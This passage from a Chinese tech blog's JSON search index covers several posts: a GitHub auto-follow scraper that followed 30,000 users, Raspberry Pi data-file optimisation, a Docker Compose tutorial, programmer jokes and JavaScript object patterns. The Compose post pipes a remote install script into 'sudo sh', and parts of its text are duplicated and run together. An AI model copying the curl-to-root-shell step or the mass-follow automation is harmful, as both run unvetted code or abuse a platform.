参考https://docs.microsoft.com/zh-cn/sql/linux/sql-server-linux-setup-docker","categories":[{"name":"Docker","slug":"Docker","permalink":"http://www.yfgeek.com/categories/Docker/"}],"tags":[{"name":"Docker","slug":"Docker","permalink":"http://www.yfgeek.com/tags/Docker/"},{"name":"SQLserver","slug":"SQLserver","permalink":"http://www.yfgeek.com/tags/SQLserver/"}],"keywords":[{"name":"Docker","slug":"Docker","permalink":"http://www.yfgeek.com/categories/Docker/"}]},{"title":"当我关注3万Github用户后发生了什么","slug":"github3k","date":"2016-11-19T03:36:26.000Z","updated":"2017-10-26T12:59:55.524Z","comments":true,"path":"2016/11/19/github3k/","link":"","permalink":"http://www.yfgeek.com/2016/11/19/github3k/","excerpt":"前言16天前，写了一个小python程序，自动关注Github里的人，python真是尤物，能快速麻出想做的程序。 于是乎我利用这个关注了3万人的Github，可是关注后除了同性交友似乎没有什么用，而我发现一件事，就是我的首页动态变化如同刷新浪微博一样，每个人都在star或fork各种项目，不乏很多精品资源。","text":"前言16天前，写了一个小python程序，自动关注Github里的人，python真是尤物，能快速麻出想做的程序。 于是乎我利用这个关注了3万人的Github，可是关注后除了同性交友似乎没有什么用，而我发现一件事，就是我的首页动态变化如同刷新浪微博一样，每个人都在star或fork各种项目，不乏很多精品资源。 翻都翻不过来，那么同时还存在一些“无用( 垃圾 )项目”，star和fork数量很少，点开没有意义。那么能否写一个python小程序，把“高质量”的项目来源于好友follow的项目都爬出来呢？ 经过短暂的编码，GithubAwesome.py诞生了。 现在进入AutoGithub项目就可以看到GithubAwesome.py项目 规则设置一个规则，如果关注的人的动态里刷出来的项目 star数量 大于 最少 star 或 大于 最少 fork，那么就把他输出出来。 举个🌰12最少 star 数: 50最少 fork 数: 50 效果如图 配置首先，确保你安装了beautifulsoup4. 1pip install beautifulsoup4 然后编辑GithubAwesome.py文件，请原谅如此土的方式。1234ga = GithubAwesome('username','password')# loginga.login()ga.get_awesome(1,20,50) # 第一页 规则 min star 20 min or fork 20 写在最后当你关注超过1K的用户，你会感叹，每天都有精品项目推送的感觉，真好！😁","categories":[{"name":"Github","slug":"Github","permalink":"http://www.yfgeek.com/categories/Github/"}],"tags":[{"name":"Github","slug":"Github","permalink":"http://www.yfgeek.com/tags/Github/"}],"keywords":[{"name":"Github","slug":"Github","permalink":"http://www.yfgeek.com/categories/Github/"}]},{"title":"树莓派实时温度湿度监测 优化后续","slug":"opt-rpi-project","date":"2016-11-17T15:46:21.000Z","updated":"2017-10-26T12:59:55.526Z","comments":true,"path":"2016/11/17/opt-rpi-project/","link":"","permalink":"http://www.yfgeek.com/2016/11/17/opt-rpi-project/","excerpt":"树莓派这个项目已经过去了两月了，一直没有维护，直到我到了英国后发现，在英国连接北京的树莓派网速堪忧，只有100kb/s，每次想查看家里的温度情况，都要等待很长时间才能加载出来，有时候会丢包，这让我很不爽，于是我决定小小的优化一下。","text":"树莓派这个项目已经过去了两月了，一直没有维护，直到我到了英国后发现，在英国连接北京的树莓派网速堪忧，只有100kb/s，每次想查看家里的温度情况，都要等待很长时间才能加载出来，有时候会丢包，这让我很不爽，于是我决定小小的优化一下。 优化css js之前写的css与js一直没有压缩，这次决定用gulp压缩一下 安装 gulp1npm install -g gulp 安装 gulp-uglify 模块1npm install gulp-uglify 安装 gulp-minify-css 模块1npm install gulp-minify-css 压缩源：12asset/dist/jsasset/dist/css 目标：12asset/jsasset/css 好的 我们可以开始写gulpfile.js文件了12345678910111213141516171819202122232425262728293031323334353637383940// 获取 gulpvar gulp = require('gulp')// 获取 uglify 模块（用于压缩 JS）var uglify = require('gulp-uglify')// 获取 minify-css 模块（用于压缩 CSS）var minifyCSS = require('gulp-minify-css')// 压缩 js 文件// 在命令行使用 gulp script 启动此任务gulp.task('script', function() &#123; // 1. 找到文件 gulp.src('asset/dist/js/*.js') // 2. 压缩文件 .pipe(uglify()) // 3. 另存压缩后的文件 .pipe(gulp.dest('asset/js'))&#125;)// 压缩 css 文件// 在命令行使用 gulp css 启动此任务gulp.task('css', function () &#123; // 1. 找到文件 gulp.src('asset/dist/css/*.css') // 2. 压缩文件 .pipe(minifyCSS()) // 3. 另存为压缩文件 .pipe(gulp.dest('asset/css'))&#125;)// 在命令行使用 gulp auto 启动此任务gulp.task('auto', function () &#123; // 监听文件修改，当文件被修改则执行 script 任务 gulp.watch('js/*.js', ['script']) gulp.watch('css/*.css', ['css'])&#125;)// 使用 gulp.task('default') 定义默认任务// 在命令行使用 gulp 启动 script 任务和 auto 任务gulp.task('default', ['script', 'css' , 'auto']) 执行gulp即可进行自动压缩及监听任务 结构优化这是原有的结构 前端：Semantic UI + eCharts + JQuery Datapicker 数据： json(时间) 后端：Python + Apache 后端的python程序负责测温度和测湿度，并生成json数据，为了保证事实性，python程序一直在读写相同的json文件，每一分钟读写一次，造成了json文件的比较大，大概有68KB，在前端是通过ajax加载的json文件，如果网速很慢的话，必然会造成很长时间的延迟。 为了解决这个问题，首先第一步就是减小json文件大小。设计了一个解决方案是，以前的前端已经可以加载每小时数据和每分钟数据，不过小时和分钟的数据是通过在js中忽略加载实现的。 而现在采用新的方案，在data数据目录下，分别建立两个目录。 12data/mindata/hour 数据： json(min) / json(hour) min的数据专门用于保存min,hour专门用于保存hour，为了解决旧数据迁移问题，首先先将内容移动到min目录下，在根目录下写了一个python小程序，执行挑选出hour数据并且迁移。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546#!/usr/bin/pythonimport sysimport timeimport jsonimport osimport stringdef jsonRead(path,topath,name): pathfile = path + '/' + name topathfile = topath + '/' + name if os.path.exists(pathfile): file =open(pathfile,\"r\") data = json.loads(file.read().decode('utf-8')) i = 1 jsonWrite(data[0],topathfile) for v in data: i = i + 1 if(i%60==0): jsonWrite(v,topathfile) file.close() else: print 'unable to open ' + pathfile + 'file'def jsonWrite(data,pathfile): if os.path.exists(pathfile): file =open(pathfile,\"rb+\") file.seek(-1,os.SEEK_END) file.truncate() file.write(\",\") json.dump(data,file) file.write(\"]\") file.close() print 'succes: '+ pathfile else: file =open(pathfile,\"w\") file.write(\"[\") json.dump(data,file) file.write(\"]\") file.close()dir = 'web/data/min'dist = 'web/data/hour'files = os.listdir(dir)for root, dirs, files in os.walk(dir): for name in files: jsonRead(dir,dist,name) 与此同时也需要修改 前端js 与 后端python具体代码在 项目地址，不贴了。 最后，经过优化，速度大概提升了5倍，前端获取的json文件为1KB。 后续还会增加季度数据统计，等待数据量大一点的时候方便做数据统计工作。","categories":[{"name":"Raspberry","slug":"Raspberry","permalink":"http://www.yfgeek.com/categories/Raspberry/"}],"tags":[{"name":"Raspberry","slug":"Raspberry","permalink":"http://www.yfgeek.com/tags/Raspberry/"}],"keywords":[{"name":"Raspberry","slug":"Raspberry","permalink":"http://www.yfgeek.com/categories/Raspberry/"}]},{"title":"Github Follow 及 BaiduBlogTransfer 项目","slug":"Github Follow 及 BaiduBlogTransfer 项目","date":"2016-11-07T17:24:35.000Z","updated":"2017-10-26T12:59:55.517Z","comments":true,"path":"2016/11/08/Github Follow 及 BaiduBlogTransfer 项目/","link":"","permalink":"http://www.yfgeek.com/2016/11/08/Github Follow 及 BaiduBlogTransfer 项目/","excerpt":"最近总是有莫名其妙的人关注我的Github，于是乎突发奇想，做了一个Github批量跟随的Python小程序。 用Python做这种事情最过瘾，Python短小、精炼、库多，非常好用，用了不到2个小时就把整个小程序完成了。","text":"最近总是有莫名其妙的人关注我的Github，于是乎突发奇想，做了一个Github批量跟随的Python小程序。 用Python做这种事情最过瘾，Python短小、精炼、库多，非常好用，用了不到2个小时就把整个小程序完成了。项目地址： 点击进入项目 除此之外，我还整理了只去百度空间的Blogs放到了Github封存。 https://github.com/yfgeek/Blog 目录是用一个python小程序自动生成的，通过修改@cheezer的BaiduBlogTransfer项目的代码，添加了生成Markdown功能，把原来百度空间的内容全部导出来了。 点击进入项目 百度空间是我最早的Blog(2007-2011)，小学初中，后转战独立空间VPS，先后用过Worldpress,Ghost以及现在的Hexo。 百度空间有着很多的回忆，和百度斗智斗勇玩import js的eDIKID.CSS是美好的回忆❤️。 百度空间被百度关闭了，文章也没有了。 百度空间为我在初中高中时的玩具，部分内容掺杂当时网络用语，而且现在看来相当多的文章打脸，请不要用现在的眼光和视野去看过去的文章，在那个时候没有现在的思想和技术，所以文章内容过于幼稚。 ❤️:3Mac","categories":[{"name":"github","slug":"github","permalink":"http://www.yfgeek.com/categories/github/"}],"tags":[{"name":"github","slug":"github","permalink":"http://www.yfgeek.com/tags/github/"}],"keywords":[{"name":"github","slug":"github","permalink":"http://www.yfgeek.com/categories/github/"}]},{"title":"Docker Compose—简化复杂应用的利器 ","slug":"Docker-Compose—简化复杂应用的利器","date":"2016-10-15T11:10:35.000Z","updated":"2017-10-26T12:59:55.516Z","comments":true,"path":"2016/10/15/Docker-Compose—简化复杂应用的利器/","link":"","permalink":"http://www.yfgeek.com/2016/10/15/Docker-Compose—简化复杂应用的利器/","excerpt":"Compose是用于定义和运行复杂Docker应用的工具。你可以在一个文件中定义一个多容器的应用，然后使用一条命令来启动你的应用，然后所有相关的操作都会被自动完成。","text":"Compose是用于定义和运行复杂Docker应用的工具。你可以在一个文件中定义一个多容器的应用，然后使用一条命令来启动你的应用，然后所有相关的操作都会被自动完成。 1. 安装Docker和Compose1234567# 当前最新的Docker是1.6.2，Compose为1.2.0curl -s https://get.docker.io/ubuntu/ | sudo shsudo apt-get updatesudo apt-get install lxc-docker# 参考http://docs.docker.com/compose/install/#install-composecurl -L https://github.com/docker/compose/releases/download/1.2.0/docker-compose-`uname -s`-`uname -m` &amp;gt; /usr/local/bin/docker-composechmod +x /usr/local/bin/docker-compose 1234### 上面这个方法真的慢出翔，可以通过Python pip安装。apt-get install python-pip python-devpip install -U docker-compose 当前最新的Docker是1.6.2，Compose为1.2.012sudo apt-get updatesudo apt-get install lxc-docker 参考 http://docs.docker.com/compose/install/#install-compose123456curl -L https://github.com/docker/compose/releases/download/1.2.0/docker-compose-uname -s-uname -m &gt; /usr/local/bin/docker-compose curl -L https://github.com/docker/compose/releases/download/1.2.0/docker-compose-uname -s-uname -m &gt; /usr/local/bin/docker-composechmod +x /usr/local/bin/docker-compose### 上面这个方法真的慢出翔，可以通过Python pip安装。apt-get install python-pip python-devpip install -U docker-compose 这样compose就安装好了，查看一下compose的版本信息： 123chmod +x /usr/local/bin/docker-composedocker-compose -versiondocker-compose 1.2.0 2. 使用Compose使用Compose只需要简单的三个步骤： 首先，使用Dockerfile来定义你的应用环境：1234FROM python:2.7ADD ./codeWORKDIR /codeRUN pip install -r requirements.txt 其中，requirements.txt中的内容包括： 12flaskredis 再用Python写一个简单的app.py12345from flask importFlaskfrom redis importRedisimport osapp =Flask(__name__)redis =Redis(host='redis', port=6379)@app.route('/')def hello(): redis.incr('hits')return'Hello World! I have been seen %s times.'% redis.get('hits')if __name__ ==\"__main__\": app.run(host=\"0.0.0.0\", debug=True) 第二步，用一个compose.yaml来定义你的应用服务，他们可以把不同的服务生成不同的容器中组成你的应用1234567891011web: build:. command: python app.py ports: - \"5000:5000\" volumes: - .:/code links: - redisredis: image: redis 第三步，执行docker-compose up来启动你的应用，它会根据compose.yaml的设置来pull/run这俩个容器，然后再启动。12345678910111213141516171819Creating myapp_redis_1...Creating myapp_web_1...Building web...Step 0 : FROM python:2.72.7: Pulling from python...Status: Downloaded newer image for python:2.7 ---&gt; d833e0b23482Step 1 : ADD . /code ---&gt; 1c04b1b15808Removing intermediate container 9dab91b4410dStep 2 : WORKDIR /code ---&gt; Running in f495a62feac9 ---&gt; ffea89a7b090Attaching to myapp_redis_1, myapp_web_1......redis_1 | [1] 17 May 10:42:38.147 * The server is now ready to accept connections on port 6379web_1 | * Running on http://0.0.0.0:5000/ (Press CTRL+C to quit)web_1 | * Restarting with stat 3. Yaml文件参考在上面的yaml文件中，我们可以看到compose文件的基本结构。首先是定义一个服务名，下面是yaml服务中的一些选项条目： image:镜像的ID build:直接从pwd的Dockerfile来build，而非通过image选项来pull links：连接到那些容器。每个占一行，格式为SERVICE[:ALIAS],例如 – db[:database] external_links：连接到该compose.yaml文件之外的容器中，比如是提供共享或者通用服务的容器服务。格式同links command：替换默认的command命令 ports: 导出端口。格式可以是： 1ports:-&quot;3000&quot;-&quot;8000:8000&quot;-&quot;127.0.0.1:8001:8001&quot; expose：导出端口，但不映射到宿主机的端口上。它仅对links的容器开放。格式直接指定端口号即可。 volumes：加载路径作为卷，可以指定只读模式。123volumes:-/var/lib/mysql - cache/:/tmp/cache -~/configs:/etc/configs/:ro volumes_from：加载其他容器或者服务的所有卷12environment:- RACK_ENV=development - SESSION_SECRET env_file：从一个文件中导入环境变量，文件的格式为RACK_ENV=development extends:扩展另一个服务，可以覆盖其中的一些选项。一个sample如下：12345678910111213common.ymlwebapp: build:./webapp environment:- DEBUG=false- SEND_EMAILS=falsedevelopment.ymlweb:extends: file: common.yml service: webapp ports:-&quot;8000:8000&quot; links:- db environment:- DEBUG=truedb: image: postgres net：容器的网络模式，可以为”bridge”, “none”, “container:[name or id]”, “host”中的一个。dns：可以设置一个或多个自定义的DNS地址。 dns_search:可以设置一个或多个DNS的扫描域。 其他的working_dir, entrypoint, user, hostname, domainname, mem_limit, privileged, restart, stdin_open, tty, cpu_shares，和docker run命令是一样的，这些命令都是单行的命令。例如： 1234567891011cpu_shares:73working_dir:/codeentrypoint: /code/entrypoint.shuser: postgresqlhostname: foodomainname: foo.commem_limit:1000000000privileged:truerestart: alwaysstdin_open:truetty:true 4. docker-compose常用命令在第二节中的docker-compose up，这两个容器都是在前台运行的。我们可以指定-d命令以daemon的方式启动容器。除此之外，docker-compose还支持下面参数： –verbose：输出详细信息 -f 制定一个非docker-compose.yml命名的yaml文件 -p 设置一个项目名称（默认是directory名） docker-compose的动作包括： build：构建服务 kill -s SIGINT：给服务发送特定的信号。 logs：输出日志 port：输出绑定的端口 ps：输出运行的容器 pull：pull服务的image rm：删除停止的容器 run: 运行某个服务，例如docker-compose run webpython manage.py shell start：运行某个服务中存在的容器。 stop:停止某个服务中存在的容器。 up：create + run + attach容器到服务。 scale：设置服务运行的容器数量。例如：docker-compose scale web=2 worker=3 转载:http://debugo.com/docker-compose","categories":[{"name":"Docker","slug":"Docker","permalink":"http://www.yfgeek.com/categories/Docker/"}],"tags":[{"name":"Docker","slug":"Docker","permalink":"http://www.yfgeek.com/tags/Docker/"}],"keywords":[{"name":"Docker","slug":"Docker","permalink":"http://www.yfgeek.com/categories/Docker/"}]},{"title":"程序员鄙视链","slug":"程序员鄙视链","date":"2016-10-12T07:07:48.000Z","updated":"2017-10-26T12:59:55.527Z","comments":true,"path":"2016/10/12/程序员鄙视链/","link":"","permalink":"http://www.yfgeek.com/2016/10/12/程序员鄙视链/","excerpt":"纯粹的一些梗，比较搞笑。来源知乎和其他网站。","text":"纯粹的一些梗，比较搞笑。来源知乎和其他网站。 编辑器Emacs → Vim → Sublime → Word → Power PointVim →→ Emacs + evil插件notepad++ → notepadall → Source Insight → notepad 语言asm → C ↔ C++ ↔ Java ↔ C# → JavaScript → VB → VBScriptCommon Lisp ↔ Scheme → Emacs Lisp →→ PythonPython ↔ Perl → shellPHP → all 操作系统Unix → Linux → Windows → DOSSolaris →→ 其他UnixBSD ↔ SystemOpenBSD ↔ FreeBSD → NetBSDArch → Debian → RedhatDebian → UbuntuFedora → CentOS → RHELOSX → all IDEEmacs + plugins ↔ Vim + plugins → 其他加插件的编辑器IntelliJ → Eclipse → NetBeansCode::Blocks → CodeLiteVS → all → Turbo C 2.0 图片 工具篇 系统软件篇 职场篇 转载自：https://www.zhihu.com/question/24270600","categories":[{"name":"笑话","slug":"笑话","permalink":"http://www.yfgeek.com/categories/笑话/"}],"tags":[{"name":"笑话","slug":"笑话","permalink":"http://www.yfgeek.com/tags/笑话/"}],"keywords":[{"name":"笑话","slug":"笑话","permalink":"http://www.yfgeek.com/categories/笑话/"}]},{"title":"JavaScript创建对象的七种模式","slug":"JavaScript创建对象的七种模式","date":"2016-10-11T05:16:14.000Z","updated":"2017-10-26T12:59:55.518Z","comments":true,"path":"2016/10/11/JavaScript创建对象的七种模式/","link":"","permalink":"http://www.yfgeek.com/2016/10/11/JavaScript创建对象的七种模式/","excerpt":"","text":"&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ECMA-262把对象定义为：”无需属性的集合，其属性可以包含基本值、对象或者函数。”严格来讲，这就相当于说明对象是一组没有特定顺序的值。对象的每个属性或方法都有一个名字，而每个名字都映射到一个值。正因为这样，我们可以把ECMAScript的对象想象成散列表：无非就是一组名对值，其中值可以是数据或函数。&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;创建自定义对象最简单的方式就是创建一个Object的实例，然后再为他添加属性和方法，如下所示：var person = new Object();、person.name = “liubei”;person.age = 29;person.job = “shayemuyou”;person.sayName = function(){ &nbsp; &nbsp;&nbsp; alert(this.name);}&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;上面的例子创建了一个名为person的对象，并为他添加了三个属性和一个方法。其中sayName()方法用于显示name属性，this.name将被解析为person.name，早期的开发人员经常使用这个模式来创建对象，后来对象字面量的方法成了创建对象的首选模式，上面的例子用对象字面量的语法可以写成如下这样：var person = { &nbsp; &nbsp; &nbsp; &nbsp;&nbsp;name:“liubei”, &nbsp; &nbsp; &nbsp; &nbsp;&nbsp;age:29, &nbsp; &nbsp; &nbsp; &nbsp;&nbsp;job:“shayemuyou”, &nbsp; &nbsp; &nbsp; &nbsp;&nbsp;sayName:function(){ &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp;alert(this.name); &nbsp; &nbsp; &nbsp; &nbsp;&nbsp;}}&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;这个例子中的person对象和前面的对象是一样的，都有相同的属性和方法。&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;虽然Object构造函数或者对象字面量的方法都可以用来创建单个对象，但是这些方法有个明显的缺点：使用同一个接口创建很多对象，会产生大量的重复代码。为了解决这个方法，人们开始使用工厂模式的一种变体。一、工厂模式&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;工厂模式是软件工程领域一种广为人知的设计模式，这种模式抽象了创建具体对象的过程。考虑到ECMAScript中无法创建类，开发人员就发明了一种函数，用函数来封装以特定接口创建对象的细节，如下所示：function createPerson(name, age, job){ &nbsp; var o = new Object(); &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; o.name = name; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; o.age = age; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; o.job = job; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; o.sayName = function(){ &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; alert(this.name); &nbsp; &nbsp;&nbsp; } &nbsp;return o;}var person1 = createPerson(“wei”,25,“software”);var person2 = createPerson(“bu”,25,“software”);&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;函数createPerson()能够根据接受的参数来构建一个包含所有必要信息的Person对象。可以多次调用这个函数，每次都会返回一个包含三个属性一个方法的对象。工厂模式虽然解决了创建多个相似对象的问题，但却没有解决对象识别的问题，即怎么样知道这是哪个对象类型。二、构造函数模式&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;像Array、Object这样的原生构造函数，在运行时会自动出现在执行环境中。此外，我们可以创建自定义个构造函数，从而定义自定义类型的属性和方法。例如，我们可以使用构造函数重写上个例子：function Person(name, age, job){ &nbsp; &nbsp; &nbsp; &nbsp;this.name = name; &nbsp; &nbsp;this.age = age; &nbsp; &nbsp;this.job = job; &nbsp; &nbsp;this.sayName = function(){ &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; &nbsp; &nbsp;alert(this.name); &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; &nbsp;}}var person1 = new Person(“wei”,25,“software”);var person2 = new Person(“bu”,25,“software”);&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在这个例子中，Person()函数取代了createPerson()函数，我们注意到Person()与createPerson()的不同之处在于：没有显式的创建对象直接将属性和方法赋值给this对象没有return语句&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;此外，还应该注意到函数名Person使用的是大写字母P。按照惯例，构造函数始终都应该以一个大写字母开头，而非构造函数则应该以一个小写字母开头。这个做法借鉴了其他OO语言，主要是为了区别于ECMAScript中的其他函数。因为构造函数本身也是函数，只不过可以创建对象而已。&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;要创建一个Person实例，必须使用new操作符。以上这种方式会经过以下四个步骤：&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;1、创建一个新对象&nbsp;&nbsp;&nbsp;&nbsp;2、将构造函数的作用域赋给新对象（因此this指向这个新对象）&nbsp;&nbsp;&nbsp;&nbsp;3、执行构造函数中的代码&nbsp;&nbsp;&nbsp;&nbsp;4、返回新对象&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在前面例子的最后，person1和person2分别保存着Person的一个不同的实例。这两个对象都有一个constructor（构造函数）属性，该属性指向Person。如下：console.log(person1.constructor == Person); &nbsp; &nbsp; //trueconsole.log(person2.constructor == Person); &nbsp; &nbsp; //true&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;对象的constructor属性最初是用来标识对象类型的。但是，提到检测对象类型，还是instanceof操作符比较可靠一些。我们在这个例子中创建的对象都是Object对象的实例，也是Person对象的实例，这一点通过instanceof操作符可以验证。console.log(person1 instanceof Object); &nbsp; &nbsp; //trueconsole.log(person1 instanceof Person); &nbsp; &nbsp; //trueconsole.log(person2 instanceof Object); &nbsp; &nbsp; //trueconsole.log(person2 instanceof Person); &nbsp; &nbsp; //true&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;创建自定义的构造函数意味着将来可以将他的实例标识为一种特定的类型；而这正是构造函数模式胜过工厂模式的地方。在这个例子中，person1和person2之所以同是Object的实例，是因为所有的对象都继承自Object。&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;构造函数的主要问题，就是每个方法都要在实例上重新创建一遍，造成内存浪费。在前面的例子中，person1和person2都有一个名为sayName()的方法，但是两个方法不是同一Function的实例。不要忘了ECMAScript中的函数也是对象，因此每定义一个函数，也就是实例化了一个对象，从逻辑角度讲，此时的构造函数可以这样定义：function Person(name, age, job){&nbsp;&nbsp;&nbsp;&nbsp;this.name = name; &nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;this.age = age; &nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;this.job = job; &nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;this.sayName = new Function(“alert(this.name);”) &nbsp; &nbsp;&nbsp;&nbsp;&nbsp;//与声明函数在逻辑上是等价的}&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;从这个角度来看构造函数，更容易看明白每个Person实例都会包含一个不同的Function实例的本质。说明白些，会导致不同的作用域链和标识符解析，但是创建Function新实例的机制仍然是相同的。因此，不同实例上的同名函数是不相等的，以下代码可以证实这一点。alert(person1.sayName == person2.sayName); &nbsp;//false&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;然而，创建两个完成同样任务的Function实例的确没有必要；况且有this对象在，根本不用在执行代码前就把函数绑定到特定的对象上。因此，可以像下面这样，通过把函数定义转移到构造函数外部来解决这个问题。function Person(name, age, job){&nbsp;&nbsp;&nbsp;&nbsp;this.name = name; &nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;this.age = age; &nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;this.job = job; &nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;this.sayName = sayName;}function sayName(){ &nbsp; &nbsp;alert(this.name);}&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;这样做解决了多个函数解决相同问题的问题，但是有产生了新的问题，在全局作用域中实际上只被某个对象调用，这让全局对象有点名不副实。更让人无法接受的是：如果对象需要定义很多方法，那么就要定义很多全局函数，于是我们这个自定义的引用类型就丝毫没有封装性可言了。好在这些问题可以使用原型模式来解决。三、原型模式&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;我们创建的每个函数都有一个prototype（原型）属性，这个属性是一个指针，指向一个对象，而这个对象的用途是包含可以由特定类型的所有实例共享的属性和方法。使用原型对象的实例就是让所有实例共享它所包含的属性和方法。换句话说，不必在构造函数中定义对象的实例信息，而是可以将这些信息直接添加到原型对象中，如下所示：function Person(){}Person.prototype.name = “wei”;Person.prototype.age = 27;Person.prototype.job = “Software”;Person.prototype.sayName = function(){ &nbsp; &nbsp; &nbsp;alert(this.name);} var person1 = new Person();person1.sayName(); &nbsp; &nbsp; &nbsp;//“wei”var person2 = new Person();person2.sayName(); &nbsp; &nbsp; &nbsp;//“wei”alert(person1.sayName == person2.sayName);&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在此，我们将sayName()方法和所有的属性直接添加在了Person的prototype属性中，构造函数变成了空函数。即便如此，我们仍然可以通过构造函数来创建新对象，而且新对象还会具有相同的属性和方法。但是与构造函数不同的是，新对象的这些属性和方法是由所有实例共享的。换句话说，person1和person2访问的都是同一组属性和同一个sayName()函数。要理解原型模式的工作原理，就必须先理解ECMAScript中原型对象的性质。&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;原型对象的本性由于篇幅太长将会在下一章节详细分析。上面我们说了原型模式的好处，接下来我们来看一下原型模式的缺点。原型模式省略了为构造函数传递参数的这一环节，结果所有实例在默认情况下都具有相同的属性值。这会在某些程度上带来一种不便，这并不是原型模式最大的问题，因为如果我们想为一个通过原型模式创建的对象添加属性时，添加的这个属性就会屏蔽原型对象的保存的同名属性。换句话说，就是添加的这个属性会阻止我们去访问原型中的属性，但并不会改变原型中的属性。&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;原型模式最大的问题是由其共享的本质所导致的。原型中所有的属性被很多实例共享，这种共享对函数非常合适，对包含基本值的属性也说的过去，但是对引用类型的属性值来说问题就比较突出了，下面我们来看一个例子：function Person(){}Person.prototype = { &nbsp; &nbsp; &nbsp; &nbsp;constructor:Person, &nbsp; &nbsp; &nbsp; &nbsp;name:“wei”, &nbsp; &nbsp; &nbsp; &nbsp;age:29, &nbsp; &nbsp; &nbsp; &nbsp;friends:[“乾隆”,“康熙”], &nbsp; &nbsp; &nbsp; &nbsp;sayName:function(){ &nbsp; &nbsp; &nbsp; &nbsp;alert(this.name); &nbsp; &nbsp;}}var person1 = new Person();var person2 = new Person();person1.friends.push(“嬴政”);console.log(person1.friends); &nbsp; //[“乾隆”,“康熙”,“嬴政”]console.log(person2.friends); &nbsp; //[“乾隆”,“康熙”,“嬴政”]console.log(person1.friends === person2.friends); &nbsp; //true&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;上面的例子中，Person.prototype对象有一个名为friends的属性，该属性包含一个字符串数组。然后创建了两个Person的实例，接着修改person1.friends引用的数组，向数组中添加一个字符串，由于数组存在于Person.prototype中而不是person1中，所以person2.friends也会被修改。但是一般每个对象都是要有属于自己的属性的，所以我们很少看到有人单独使用原型模式来创建对象。四、组合使用构造函数模式和原型模式&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;创建自定义类型最常见的方式就是组合使用构造函数模式与原型模式。构造函数模式用于定义实例属性，原型模式用于定义方法和共享的属性。结果，每个实例都会有自己的一份实例属性的副本，但同时又共享着对方法的引用，最大限度的节省了内存。另外，这种混成模式还支持向构造函数传递参数；可谓是集两种模式之长。下面的代码重写了前面的例子：function Person(name, age){ &nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;this.name = name; &nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;this.age = age; &nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;this.friends = [“乾隆”,“康熙”];}Person.prototype = { &nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;constructor:Person, &nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sayName:function(){ &nbsp; &nbsp; &nbsp; &nbsp;alert(this.name); &nbsp; &nbsp;}}var person1 = new Person(“wei”,29);var person2 = new Person(“bu”,25);person1.friends.push(“嬴政”);console.log(person1.friends); &nbsp; //[“乾隆”, “康熙”, “嬴政”]console.log(person2.friends); &nbsp; //[“乾隆”, “康熙”]console.log(person1.friends === person2.friends); &nbsp; //falseconsole.log(person1.sayName === person2.sayName); &nbsp; 